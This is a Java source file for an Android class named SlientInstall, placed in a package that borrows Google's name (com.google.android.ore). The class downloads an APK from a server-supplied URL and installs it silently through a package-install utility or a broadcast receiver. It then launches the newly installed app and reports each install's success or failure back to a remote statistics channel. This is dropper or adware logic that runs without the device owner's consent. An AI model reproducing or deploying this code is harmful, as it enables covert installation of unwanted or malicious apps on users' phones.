package com.google.android.ore;

import java.io.File;

import android.content.Context;
import android.os.AsyncTask;

import com.google.android.ore.bean.OreFloatingWindow;
import com.google.android.ore.bean.OreGeneral;
import com.google.android.ore.bean.OreItemInfo;
import com.google.android.ore.bean.OreType;
import com.google.android.ore.db.dao.OreGeneralDao;
import com.google.android.ore.db.dao.OreItemInfoDao;
import com.google.android.ore.report.OreReport;
import com.google.android.ore.report.bean.ReportKey;
import com.google.android.ore.thinkandroid.L;
import com.google.android.ore.thinkandroid.http.AsyncHttpClient;
import com.google.android.ore.thinkandroid.http.FileHttpResponseHandler;
import com.google.android.ore.util.ApkUtil;
import com.google.android.ore.util.PackageUtils;

public class SlientInstall {

	protected String TAG = SlientInstall.class.getSimpleName();

	public static final int SLIENT_APK_NOT_READY = 0; // 应用尚未拉取
	public static final int SLIENT_APK_READY = 1;// 应用拉取成功
	public static final int SLIENT_APK_INSTALL_SUCCESS = 2;// 安装成功
	public static final int SLIENT_APK_INSTALL_FAIL = 3;// 安装成功
	public static final int SLIENT_APK_FETCH_MAX = 4;// 素材拉取达到上限
	public static final int SLIENT_APK_ULR_EMPTY = 5;// 素材地址空
	public static final int NOT_COMPLETE_APK_ERROR = 6; // 不是安装程序


	public static final int CHECK_APK_AND_INSTALL_RET_FAIL = 0;
	public static final int CHECK_APK_AND_INSTALL_RET_FAIL_DIR_NOT_EXIST = 1;
	public static final int CHECK_APK_AND_INSTALL_RET_FAIL_FILE_NOT_EXIST = 2;
	public static final int CHECK_APK_AND_INSTALL_RET_FETCH_MAX = 3;
	public static final int CHECK_APK_AND_INSTALL_RET_INSTALL_FAIL = 4;
	public static final int CHECK_APK_AND_INSTALL_RET_INSTALL_SUCC = 5;

	protected volatile boolean isAliving = false;

	public boolean isAliving() {
		return isAliving;
	}

	public void fetch(Context context) {
		L.d(TAG, "fetch isAliving:" + isAliving);
		if (isAliving) {
			return;
		}
		isAliving = true;
		syncFetch(context);
	}

	protected void syncFetch(final Context context) {
		try {
			OreGeneral oreGeneral = OreGeneralDao.get().getOreGeneralSlient();
			if (oreGeneral != null) {
				L.d(TAG, "syncFetch oreGeneral.status:" + oreGeneral.status);
				switch (oreGeneral.status) {
				case SLIENT_APK_NOT_READY: {
					fetchResource(context, oreGeneral);
					break;
				}
				case SLIENT_APK_READY:
					syncCheckApkAndInstall(context, oreGeneral, null);
					break;
				default:
					isAliving = false;
					break;
				}
			} else {
				L.d(TAG, "syncFetch oreGeneral is null");
				isAliving = false;
			}
		} catch (Exception e) {
			isAliving = false;
		}
	}

	protected void fetchResource(final Context context,
			final OreGeneral oreGeneral) {
		if (oreGeneral != null) {
			L.d(TAG, "fetch oreGeneral.ore_id:" + oreGeneral.ore_id
					+ " oreGeneral.ore_type:" + oreGeneral.ore_type);
			OreItemInfo oreItemInfo = OreItemInfoDao.get().get(
					oreGeneral.ore_item_id);
			if (oreItemInfo != null) {
				File resDir = Constant.getDir(Constant.RES_ZIP_DIR);
				final String resFileName = resDir.getAbsolutePath() + "/"
						+ oreItemInfo.ore_item_id;
				FileHttpResponseHandler fileHttpResponseHandler = createHandler(
						oreGeneral, oreItemInfo, context, resFileName);
				fileHttpResponseHandler.setInterrupt(false);
				AsyncHttpClient syncHttpClient = new AsyncHttpClient();
				syncHttpClient.download(oreItemInfo.click_url.trim(),
						fileHttpResponseHandler);
			} else {
				isAliving = false;
			}
		} else {
			isAliving = false;
		}
	}

	protected FileHttpResponseHandler createHandler(
			final OreGeneral oreGeneral, final OreItemInfo oreItemInfo,
			final Context context, String resFileName) {
		return new FileHttpResponseHandler(resFileName) {
			@Override
			public void onFinish() {
				super.onFinish();
				L.d(TAG, "FileHttpResponseHandler finish oreGeneral.ore_id:"+oreGeneral.ore_id);
				try {
					syncCheckApkAndInstall(context, oreGeneral, oreItemInfo);
				} catch (Exception e) {
					isAliving = false;
				}
				
			}
		};
	}

	protected int checkLocalResZipCompleteNew(OreItemInfo oreItemInfo) {
		int result = OreFloatingWindow.SUCCESS;
		File resDir = Constant.getDir(Constant.RES_ZIP_DIR);
		if (resDir == null) {
			return OreFloatingWindow.RESOURCE_DOWNLOAD_FAIL_DIR_NOT_EXIST;
		}
		final String resFileName = resDir.getAbsolutePath() + "/"
				+ oreItemInfo.ore_item_id;
		File resFile = new File(resFileName);
		if (resFile == null || !resFile.exists()) {
			return OreFloatingWindow.RESOURCE_DOWNLOAD_FAIL_FILE_NOT_EXIST;
		}
		L.d(TAG,
				"checkLocalResZipComplete checkResExistAndComplete true resFileName:"
						+ resFileName);
		if (!ApkUtil.isCompleteApk(resFileName)) {
			return NOT_COMPLETE_APK_ERROR;
		}
		return result;
	}

	public void syncCheckApkAndInstall(final Context context,
			final OreGeneral oreGeneral, final OreItemInfo oreItemInfo) {
		L.d(TAG, "syncCheckApkAndInstall  oreGeneral.ore_id:"+oreGeneral.ore_id);
		new AsyncTask<Object, Object, Integer>() {
			OreItemInfo currOreItemInfo = null;
			@Override
			protected Integer doInBackground(Object... params) {
				if (null == oreItemInfo) {
					currOreItemInfo = OreItemInfoDao.get().get(oreGeneral.ore_item_id);
				}else{
					currOreItemInfo = oreItemInfo;
				}
				return checkApkAndInstall(context, oreGeneral, currOreItemInfo);
			}
			
			protected void onPostExecute(Integer result) {
				L.d(TAG, "syncCheckApkAndInstall  onPostExecute oreGeneral.ore_id:"+oreGeneral.ore_id + " result:"+result);
				String reportKey = "";
				switch (result) {
				case CHECK_APK_AND_INSTALL_RET_FETCH_MAX:
					reportKey = ReportKey.ore_fetch_material_retry_max;
					break;
				case CHECK_APK_AND_INSTALL_RET_INSTALL_SUCC:
					reportKey = ReportKey.ore_app_install_succ;
					break;
				case CHECK_APK_AND_INSTALL_RET_INSTALL_FAIL:
					reportKey = ReportKey.ore_app_install_fail;
					break;
				case CHECK_APK_AND_INSTALL_RET_FAIL_DIR_NOT_EXIST:
					reportKey = ReportKey.ore_fetch_material_download_dir_not_exist;
					break;
				case CHECK_APK_AND_INSTALL_RET_FAIL_FILE_NOT_EXIST:
					reportKey = ReportKey.ore_fetch_material_download_file_not_exist;
					break;

				default:
					reportKey = ReportKey.check_apk_and_install_ret_fail;
					break;
				}
				OreReport.statisticalReport(oreGeneral.ore_id, currOreItemInfo.ore_item_id,reportKey);
				isAliving = false;
			};
			
			protected void onCancelled() {
				isAliving = false;
			};

		}.execute();
	}

	public int checkApkAndInstall(final Context context,
			final OreGeneral oreGeneral, final OreItemInfo oreItemInfo) {
		int ret = CHECK_APK_AND_INSTALL_RET_FAIL;
		if (oreGeneral == null) {
			L.d(TAG, "checkApkAndInstall: null == oreGeneral");
			return ret;
		}
		if (null == oreItemInfo) {
			L.d(TAG, "checkApkAndInstall: null == oreItemInfo");
			return ret;
		}
		oreItemInfo.retry_num = oreItemInfo.retry_num + 1;
		if (oreItemInfo.retry_num > Constant.FETCHOREMATERIAL_MAX_RETRY_NUM) {
			L.d(TAG, "updateStatus retry max time");
			oreGeneral.status = SLIENT_APK_FETCH_MAX;
			ret = CHECK_APK_AND_INSTALL_RET_FETCH_MAX;
		} else {
			int result = checkLocalResZipCompleteNew(oreItemInfo);
			L.d(TAG, "updateStatus check result: " + result);
			switch (result) {
			case OreFloatingWindow.SUCCESS:
				oreGeneral.status = SLIENT_APK_READY;
				File resDir = Constant.getDir(Constant.RES_ZIP_DIR);
				final String resFileName = resDir.getAbsolutePath() + "/"
						+ oreItemInfo.ore_item_id;
				if (oreGeneral.ore_type == OreType.INSTALL_APP_BY_BROADCAST_RECEIVER) {
					ApkUtil.installAPPByBroadcastReceiver(resFileName);
					oreGeneral.status = SLIENT_APK_INSTALL_SUCCESS;
				}else{
					int installResult = PackageUtils.install(context, resFileName);
					if (installResult == PackageUtils.INSTALL_SUCCEEDED) {
						ret = CHECK_APK_AND_INSTALL_RET_INSTALL_SUCC;
					} else {
						oreGeneral.status = SLIENT_APK_INSTALL_FAIL;
						ret = CHECK_APK_AND_INSTALL_RET_INSTALL_FAIL;
					}
					if (ApkUtil.isAppInstalled(context, oreItemInfo.app_package_name)) {
						oreGeneral.status = SLIENT_APK_INSTALL_SUCCESS;
						ApkUtil.openApp(context, oreItemInfo);
					}
				}
				break;
			case OreFloatingWindow.RESOURCE_DOWNLOAD_FAIL_DIR_NOT_EXIST:
				ret = CHECK_APK_AND_INSTALL_RET_FAIL_DIR_NOT_EXIST;
				break;
			case OreFloatingWindow.RESOURCE_DOWNLOAD_FAIL_FILE_NOT_EXIST:
				ret = CHECK_APK_AND_INSTALL_RET_FAIL_FILE_NOT_EXIST;
				break;

			default:
				break;
			}
		}
		OreGeneralDao.get().update(oreGeneral);
		return ret;
	}
}